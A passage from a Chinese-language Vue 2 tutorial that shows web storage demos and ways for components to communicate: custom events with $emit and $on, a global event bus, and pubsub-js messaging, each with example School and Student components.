				<span class="nx">localStorage</span><span class="p">.</span><span class="nx">removeItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg2</span><span class="dl">'</span><span class="p">)</span>
			<span class="p">}</span>
			<span class="kd">function</span> <span class="nx">deleteAllData</span><span class="p">(){</span>
				<span class="nx">localStorage</span><span class="p">.</span><span class="nx">clear</span><span class="p">()</span>
			<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div><p><strong>sessionStorage</strong></p><div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;title&gt;</span>sessionStorage<span class="nt">&lt;/title&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;h2&gt;</span>sessionStorage<span class="nt">&lt;/h2&gt;</span>
		<span class="nt">&lt;button</span> <span class="na">onclick=</span><span class="s">"saveData()"</span><span class="nt">&gt;</span>点我保存一个数据<span class="nt">&lt;/button&gt;</span>
		<span class="nt">&lt;button</span> <span class="na">onclick=</span><span class="s">"readData()"</span><span class="nt">&gt;</span>点我读取一个数据<span class="nt">&lt;/button&gt;</span>
		<span class="nt">&lt;button</span> <span class="na">onclick=</span><span class="s">"deleteData()"</span><span class="nt">&gt;</span>点我删除一个数据<span class="nt">&lt;/button&gt;</span>
		<span class="nt">&lt;button</span> <span class="na">onclick=</span><span class="s">"deleteAllData()"</span><span class="nt">&gt;</span>点我清空一个数据<span class="nt">&lt;/button&gt;</span>

		<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span> <span class="nt">&gt;</span>
			<span class="kd">let</span> <span class="nx">p</span> <span class="o">=</span> <span class="p">{</span><span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">张三</span><span class="dl">'</span><span class="p">,</span><span class="na">age</span><span class="p">:</span><span class="mi">18</span><span class="p">}</span>

			<span class="kd">function</span> <span class="nx">saveData</span><span class="p">(){</span>
				<span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">hello!!!</span><span class="dl">'</span><span class="p">)</span>
				<span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg2</span><span class="dl">'</span><span class="p">,</span><span class="mi">666</span><span class="p">)</span>
                <span class="c1">// 转换成JSON 字符串存进去</span>
				<span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">person</span><span class="dl">'</span><span class="p">,</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">p</span><span class="p">))</span>
			<span class="p">}</span>
			<span class="kd">function</span> <span class="nx">readData</span><span class="p">(){</span>
				<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg</span><span class="dl">'</span><span class="p">))</span>
				<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg2</span><span class="dl">'</span><span class="p">))</span>

				<span class="kd">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">person</span><span class="dl">'</span><span class="p">)</span>
				<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">result</span><span class="p">))</span>

				<span class="c1">// console.log(sessionStorage.getItem('msg3'))</span>
			<span class="p">}</span>
			<span class="kd">function</span> <span class="nx">deleteData</span><span class="p">(){</span>
				<span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">removeItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg2</span><span class="dl">'</span><span class="p">)</span>
			<span class="p">}</span>
			<span class="kd">function</span> <span class="nx">deleteAllData</span><span class="p">(){</span>
				<span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">clear</span><span class="p">()</span>
			<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div><h2 id="24-组件自定义事件">2.4 组件自定义事件</h2><p>组件自定义事件是一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===&gt; 父组件</strong></p><p><strong>使用场景</strong></p><p>A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。</p><p><strong>绑定自定义事件：</strong></p><p>第一种方式，在父组件中：<code class="language-plaintext highlighter-rouge">&lt;Demo @atguigu="test"/&gt;</code> 或 <code class="language-plaintext highlighter-rouge">&lt;Demo v-on:atguigu="test"/&gt;</code></p><blockquote><p>具体代码</p></blockquote><p>App.vue</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">template</span><span class="nt">&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"app"</span><span class="nt">&gt;</span>
		<span class="c">&lt;!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第一种写法，使用@或v-on） --&gt;</span>
		<span class="nt">&lt;Student</span> <span class="err">@</span><span class="na">atguigu=</span><span class="s">"getStudentName"</span><span class="nt">/&gt;</span> 
	<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="k">import</span> <span class="nx">Student</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./components/Student</span><span class="dl">'</span>

	<span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
		<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">App</span><span class="dl">'</span><span class="p">,</span>
		<span class="na">components</span><span class="p">:{</span><span class="nx">Student</span><span class="p">},</span>
		<span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
			<span class="k">return</span> <span class="p">{</span>
				<span class="na">msg</span><span class="p">:</span><span class="dl">'</span><span class="s1">你好啊！</span><span class="dl">'</span><span class="p">,</span>
				<span class="na">studentName</span><span class="p">:</span><span class="dl">''</span>
			<span class="p">}</span>
		<span class="p">},</span>
		<span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
			<span class="nx">getStudentName</span><span class="p">(</span><span class="nx">name</span><span class="p">,...</span><span class="nx">params</span><span class="p">){</span>
				<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">App收到了学生名：</span><span class="dl">'</span><span class="p">,</span><span class="nx">name</span><span class="p">,</span><span class="nx">params</span><span class="p">)</span>
				<span class="k">this</span><span class="p">.</span><span class="nx">studentName</span> <span class="o">=</span> <span class="nx">name</span>
			<span class="p">}</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">style</span> <span class="na">scoped</span><span class="nt">&gt;</span>
	<span class="nc">.app</span><span class="p">{</span>
		<span class="nl">background-color</span><span class="p">:</span> <span class="no">gray</span><span class="p">;</span>
		<span class="nl">padding</span><span class="p">:</span> <span class="m">5px</span><span class="p">;</span>
	<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">style</span><span class="nt">&gt;</span>

</code></pre></div></div><p>Student.vue</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">template</span><span class="nt">&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"student"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"sendStudentlName"</span><span class="nt">&gt;</span>把学生名给App<span class="nt">&lt;/button&gt;</span>
	<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
		<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">Student</span><span class="dl">'</span><span class="p">,</span>
		<span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
			<span class="k">return</span> <span class="p">{</span>
				<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">张三</span><span class="dl">'</span><span class="p">,</span>
			<span class="p">}</span>
		<span class="p">},</span>
		<span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
			<span class="nx">sendStudentlName</span><span class="p">(){</span>
				<span class="c1">//触发Student组件实例身上的atguigu事件</span>
				<span class="k">this</span><span class="p">.</span><span class="nx">$emit</span><span class="p">(</span><span class="dl">'</span><span class="s1">atguigu</span><span class="dl">'</span><span class="p">,</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span><span class="mi">666</span><span class="p">,</span><span class="mi">888</span><span class="p">,</span><span class="mi">900</span><span class="p">)</span>
			<span class="p">}</span>
		<span class="p">},</span>
	<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">style</span> <span class="na">lang=</span><span class="s">"less"</span> <span class="na">scoped</span><span class="nt">&gt;</span>
	.student{
		background-color: pink;
		padding: 5px;
		margin-top: 30px;
	}
<span class="nt">&lt;/</span><span class="k">style</span><span class="nt">&gt;</span>

</code></pre></div></div><p>第二种方式，在父组件中：</p><p>使用 <strong>this.$refs.xxx.$on</strong>() 这样写起来更灵活，比如可以加定时器啥的。</p><blockquote><p>具体代码</p></blockquote><p>App.vue</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">template</span><span class="nt">&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"app"</span><span class="nt">&gt;</span>
		<span class="c">&lt;!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第二种写法，使用ref） --&gt;</span>
		<span class="nt">&lt;Student</span> <span class="na">ref=</span><span class="s">"student"</span><span class="nt">/&gt;</span>
	<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="k">import</span> <span class="nx">Student</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./components/Student</span><span class="dl">'</span>

	<span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
		<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">App</span><span class="dl">'</span><span class="p">,</span>
		<span class="na">components</span><span class="p">:{</span><span class="nx">Student</span><span class="p">},</span>
		<span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
			<span class="k">return</span> <span class="p">{</span>
				<span class="na">studentName</span><span class="p">:</span><span class="dl">''</span>
			<span class="p">}</span>
		<span class="p">},</span>
		<span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
			<span class="nx">getStudentName</span><span class="p">(</span><span class="nx">name</span><span class="p">,...</span><span class="nx">params</span><span class="p">){</span>
				<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">App收到了学生名：</span><span class="dl">'</span><span class="p">,</span><span class="nx">name</span><span class="p">,</span><span class="nx">params</span><span class="p">)</span>
				<span class="k">this</span><span class="p">.</span><span class="nx">studentName</span> <span class="o">=</span> <span class="nx">name</span>
			<span class="p">},</span>
		<span class="p">},</span>
		<span class="nx">mounted</span><span class="p">()</span> <span class="p">{</span>
			<span class="k">this</span><span class="p">.</span><span class="nx">$refs</span><span class="p">.</span><span class="nx">student</span><span class="p">.</span><span class="nx">$on</span><span class="p">(</span><span class="dl">'</span><span class="s1">atguigu</span><span class="dl">'</span><span class="p">,</span><span class="k">this</span><span class="p">.</span><span class="nx">getStudentName</span><span class="p">)</span> <span class="c1">//绑定自定义事件</span>
			<span class="c1">// this.$refs.student.$once('atguigu',this.getStudentName) //绑定自定义事件（一次性）</span>
		<span class="p">},</span>
	<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">style</span> <span class="na">scoped</span><span class="nt">&gt;</span>
	<span class="nc">.app</span><span class="p">{</span>
		<span class="nl">background-color</span><span class="p">:</span> <span class="no">gray</span><span class="p">;</span>
		<span class="nl">padding</span><span class="p">:</span> <span class="m">5px</span><span class="p">;</span>
	<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">style</span><span class="nt">&gt;</span>

</code></pre></div></div><p>Student.vue</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">template</span><span class="nt">&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"student"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"sendStudentlName"</span><span class="nt">&gt;</span>把学生名给App<span class="nt">&lt;/button&gt;</span>
	<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
		<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">Student</span><span class="dl">'</span><span class="p">,</span>
		<span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
			<span class="k">return</span> <span class="p">{</span>
				<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">张三</span><span class="dl">'</span><span class="p">,</span>
			<span class="p">}</span>
		<span class="p">},</span>
		<span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
			<span class="nx">sendStudentlName</span><span class="p">(){</span>
				<span class="c1">//触发Student组件实例身上的atguigu事件</span>
				<span class="k">this</span><span class="p">.</span><span class="nx">$emit</span><span class="p">(</span><span class="dl">'</span><span class="s1">atguigu</span><span class="dl">'</span><span class="p">,</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span><span class="mi">666</span><span class="p">,</span><span class="mi">888</span><span class="p">,</span><span class="mi">900</span><span class="p">)</span>
			<span class="p">}</span>
		<span class="p">},</span>
	<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">style</span> <span class="na">lang=</span><span class="s">"less"</span> <span class="na">scoped</span><span class="nt">&gt;</span>
	.student{
		background-color: pink;
		padding: 5px;
		margin-top: 30px;
	}
<span class="nt">&lt;/</span><span class="k">style</span><span class="nt">&gt;</span>

</code></pre></div></div><blockquote><p>若想让自定义事件只能触发一次，可以使用<code class="language-plaintext highlighter-rouge">once</code>修饰符，或<code class="language-plaintext highlighter-rouge">$once</code>方法。</p><p>触发自定义事件：<code class="language-plaintext highlighter-rouge">this.$emit('atguigu',数据)</code></p><p>使用 this.$emit() 就可以子组件向父组件传数据</p></blockquote><p><strong>解绑自定义事件</strong><code class="language-plaintext highlighter-rouge">this.$off('atguigu')</code></p><blockquote><p>代码</p></blockquote><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">this</span><span class="p">.</span><span class="nx">$off</span><span class="p">(</span><span class="dl">'</span><span class="s1">atguigu</span><span class="dl">'</span><span class="p">)</span> <span class="c1">//解绑一个自定义事件</span>
<span class="c1">// this.$off(['atguigu','demo']) //解绑多个自定义事件</span>
<span class="c1">// this.$off() //解绑所有的自定义事件</span>
</code></pre></div></div><p><strong>组件上也可以绑定原生DOM事件，需要使用<code class="language-plaintext highlighter-rouge">native</code>修饰符。</strong></p><blockquote><p>代码</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第二种写法，使用ref） --&gt;</span>
<span class="nt">&lt;Student</span> <span class="na">ref=</span><span class="s">"student"</span> <span class="err">@</span><span class="na">click.native=</span><span class="s">"show"</span><span class="nt">/&gt;</span>
</code></pre></div></div><blockquote><p>注意：通过<code class="language-plaintext highlighter-rouge">this.$refs.xxx.$on('atguigu',回调)</code>绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！</p></blockquote><h2 id="25-全局事件总线">2.5 全局事件总线</h2><ol><li><p>一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。</p></li><li><p>安装全局事件总线：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
	<span class="p">......</span>
	<span class="nx">beforeCreate</span><span class="p">()</span> <span class="p">{</span>
		<span class="nx">Vue</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">$bus</span> <span class="o">=</span> <span class="k">this</span> <span class="c1">//安装全局事件总线，$bus就是当前应用的vm</span>
	<span class="p">},</span>
    <span class="p">......</span>
<span class="p">})</span> 
</code></pre></div></div></li><li><p>使用事件总线：</p><ol><li><p>接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span></p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">methods</span><span class="p">(){</span>
  <span class="nx">demo</span><span class="p">(</span><span class="nx">data</span><span class="p">){......}</span>
<span class="p">}</span>
<span class="p">......</span>
<span class="nx">mounted</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">$bus</span><span class="p">.</span><span class="nx">$on</span><span class="p">(</span><span class="dl">'</span><span class="s1">xxxx</span><span class="dl">'</span><span class="p">,</span><span class="k">this</span><span class="p">.</span><span class="nx">demo</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div></div></li><li><p>提供数据：<code class="language-plaintext highlighter-rouge">this.$bus.$emit('xxxx',数据)</code></p></li></ol></li><li><p>最好在beforeDestroy钩子中，用$off去解绑<span style="color:red">当前组件所用到的</span>事件。</p></li></ol><blockquote><p>示例代码</p></blockquote><p>School.vue</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">template</span><span class="nt">&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"school"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;h2&gt;</span>学校名称：<span class="nt">&lt;/h2&gt;</span>
		<span class="nt">&lt;h2&gt;</span>学校地址：<span class="nt">&lt;/h2&gt;</span>
	<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
		<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">School</span><span class="dl">'</span><span class="p">,</span>
		<span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
			<span class="k">return</span> <span class="p">{</span>
				<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">尚硅谷</span><span class="dl">'</span><span class="p">,</span>
				<span class="na">address</span><span class="p">:</span><span class="dl">'</span><span class="s1">北京</span><span class="dl">'</span><span class="p">,</span>
			<span class="p">}</span>
		<span class="p">},</span>
        <span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
            <span class="nx">demo</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">我是School组件，收到了数据</span><span class="dl">'</span><span class="p">,</span><span class="nx">data</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="p">}</span>
		<span class="nx">mounted</span><span class="p">()</span> <span class="p">{</span>
			<span class="c1">// console.log('School',this)</span>
			<span class="k">this</span><span class="p">.</span><span class="nx">$bus</span><span class="p">.</span><span class="nx">$on</span><span class="p">(</span><span class="dl">'</span><span class="s1">hello</span><span class="dl">'</span><span class="p">,</span><span class="k">this</span><span class="p">.</span><span class="nx">demo</span><span class="p">)</span>
		<span class="p">},</span>
		<span class="nx">beforeDestroy</span><span class="p">()</span> <span class="p">{</span>
			<span class="k">this</span><span class="p">.</span><span class="nx">$bus</span><span class="p">.</span><span class="nx">$off</span><span class="p">(</span><span class="dl">'</span><span class="s1">hello</span><span class="dl">'</span><span class="p">)</span>
		<span class="p">},</span>
	<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">style</span> <span class="na">scoped</span><span class="nt">&gt;</span>
	<span class="nc">.school</span><span class="p">{</span>
		<span class="nl">background-color</span><span class="p">:</span> <span class="no">skyblue</span><span class="p">;</span>
		<span class="nl">padding</span><span class="p">:</span> <span class="m">5px</span><span class="p">;</span>
	<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">style</span><span class="nt">&gt;</span>
</code></pre></div></div><p>Student.vue</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">template</span><span class="nt">&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"student"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;h2&gt;</span>学生姓名：<span class="nt">&lt;/h2&gt;</span>
		<span class="nt">&lt;h2&gt;</span>学生性别：<span class="nt">&lt;/h2&gt;</span>
		<span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"sendStudentName"</span><span class="nt">&gt;</span>把学生名给School组件<span class="nt">&lt;/button&gt;</span>
	<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
		<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">Student</span><span class="dl">'</span><span class="p">,</span>
		<span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
			<span class="k">return</span> <span class="p">{</span>
				<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">张三</span><span class="dl">'</span><span class="p">,</span>
				<span class="na">sex</span><span class="p">:</span><span class="dl">'</span><span class="s1">男</span><span class="dl">'</span><span class="p">,</span>
			<span class="p">}</span>
		<span class="p">},</span>
		<span class="nx">mounted</span><span class="p">()</span> <span class="p">{</span>
			<span class="c1">// console.log('Student',this.x)</span>
		<span class="p">},</span>
		<span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
			<span class="nx">sendStudentName</span><span class="p">(){</span>
				<span class="k">this</span><span class="p">.</span><span class="nx">$bus</span><span class="p">.</span><span class="nx">$emit</span><span class="p">(</span><span class="dl">'</span><span class="s1">hello</span><span class="dl">'</span><span class="p">,</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span>
			<span class="p">}</span>
		<span class="p">},</span>
	<span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">style</span> <span class="na">lang=</span><span class="s">"less"</span> <span class="na">scoped</span><span class="nt">&gt;</span>
	.student{
		background-color: pink;
		padding: 5px;
		margin-top: 30px;
	}
<span class="nt">&lt;/</span><span class="k">style</span><span class="nt">&gt;</span>

</code></pre></div></div><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220405145110300.png" alt="image-20220405145110300" /></p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220405145706005.png" alt="image-20220405145706005" /></p><h2 id="26-消息订阅与发布">2.6 消息订阅与发布</h2><ol><li><p>一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。</p></li><li><p>使用步骤：</p><ol><li><p>安装pubsub：<code class="language-plaintext highlighter-rouge">npm i pubsub-js</code></p></li><li><p>引入: <code class="language-plaintext highlighter-rouge">import pubsub from 'pubsub-js'</code></p></li><li><p>接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身。</span></p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">methods</span><span class="p">:{</span>
  <span class="nx">demo</span><span class="p">(</span><span class="nx">data</span><span class="p">){......}</span>
<span class="p">}</span>
<span class="p">......</span>
<span class="nx">mounted</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">pid</span> <span class="o">=</span> <span class="nx">pubsub</span><span class="p">.</span><span class="nx">subscribe</span><span class="p">(</span><span class="dl">'</span><span class="s1">xxx</span><span class="dl">'</span><span class="p">,</span><span class="k">this</span><span class="p">.</span><span class="nx">demo</span><span class="p">)</span> <span class="c1">//订阅消息</span>
<span class="p">}</span>
</code></pre></div></div></li><li><p>提供数据：<code class="language-plaintext highlighter-rouge">pubsub.publish('xxx',数据)</code></p></li><li><p>最好在beforeDestroy钩子中，用<code class="language-plaintext highlighter-rouge">PubSub.unsubscribe(pid)</code>去<span style="color:red">取消订阅。</span></p></li></ol></li></ol><blockquote><p>示例代码</p></blockquote><p>订阅消息</p><p><strong>School.vue</strong></p><div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;template&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"school"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;h2&gt;</span>学校名称：<span class="nt">&lt;/h2&gt;</span>
		<span class="nt">&lt;h2&gt;</span>学校地址：<span class="nt">&lt;/h2&gt;</span>
	<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/template&gt;</span>

<span class="nt">&lt;script&gt;</span>
	<span class="k">import</span> <span class="nx">pubsub</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">pubsub-js</span><span class="dl">'</span>
	<span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
		<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">School</span><span class="dl">'</span><span class="p">,</span>
		<span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
			<span class="k">return</span> <span class="p">{</span>
				<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">尚硅谷</span><span class="dl">'</span><span class="p">,</span>
				<span class="na">address</span><span class="p">:</span><span class="dl">'</span><span class="s1">北京</span><span class="dl">'</span><span class="p">,</span>
			<span class="p">}</span>
		<span class="p">},</span>
		<span class="nx">mounted</span><span class="p">()</span> <span class="p">{</span>
			<span class="c1">// console.log('School',this)</span>
			<span class="cm">/* this.$bus.$on('hello',(data)=&gt;{
				console.log('我是School组件，收到了数据',data)
			}) */</span>
			<span class="k">this</span><span class="p">.</span><span class="nx">pubId</span> <span class="o">=</span> <span class="nx">pubsub</span><span class="p">.</span><span class="nx">subscribe</span><span class="p">(</span><span class="dl">'</span><span class="s1">hello</span><span class="dl">'</span><span class="p">,(</span><span class="nx">msgName</span><span class="p">,</span><span class="nx">data</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
				<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">)</span>
				<span class="c1">// console.log('有人发布了hello消息，hello消息的回调执行了',msgName,data)</span>
			<span class="p">})</span>
		<span class="p">},</span>
		<span class="nx">beforeDestroy</span><span class="p">()</span> <span class="p">{</span>
			<span class="c1">// this.$bus.$off('hello')</span>
			<span class="nx">pubsub</span><span class="p">.</span><span class="nx">unsubscribe</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">pubId</span><span class="p">)</span>
		<span class="p">},</span>
	<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>

<span class="nt">&lt;style </span><span class="na">scoped</span><span class="nt">&gt;</span>
	<span class="nc">.school</span><span class="p">{</span>
		<span class="nl">background-color</span><span class="p">:</span> <span class="no">skyblue</span><span class="p">;</span>
		<span class="nl">padding</span><span class="p">:</span> <span class="m">5px</span><span class="p">;</span>
	<span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>
</code></pre></div></div><p>发布消息</p><p><strong>Student.vue</strong></p><div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;template&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"student"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;h2&gt;</span>学生姓名：<span class="nt">&lt;/h2&gt;</span>
		<span class="nt">&lt;h2&gt;</span>学生性别：<span class="nt">&lt;/h2&gt;</span>
		<span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"sendStudentName"</span><span class="nt">&gt;</span>把学生名给School组件<span class="nt">&lt;/button&gt;</span>
	<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/template&gt;</span>

<span class="nt">&lt;script&gt;</span>
